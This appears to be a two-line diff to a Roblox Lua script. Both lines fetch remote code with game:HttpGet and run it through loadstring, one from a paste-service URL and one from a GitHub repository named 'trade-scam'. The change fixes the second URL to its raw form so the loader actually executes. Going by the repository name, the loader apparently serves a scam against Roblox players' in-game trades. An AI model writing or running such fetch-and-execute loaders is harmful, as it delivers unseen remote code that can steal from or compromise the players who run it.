@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2kNQDFVDgJdvxRMF/raw"))()
-local a = loadstring(game:HttpGet("https://github.com/thinhdeptrai-netizen/trade-scam/blob/main/loaderV1.0-lua"))()
+local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/thinhdeptrai-netizen/trade-scam/refs/heads/main/loaderV1.0-lua"))()
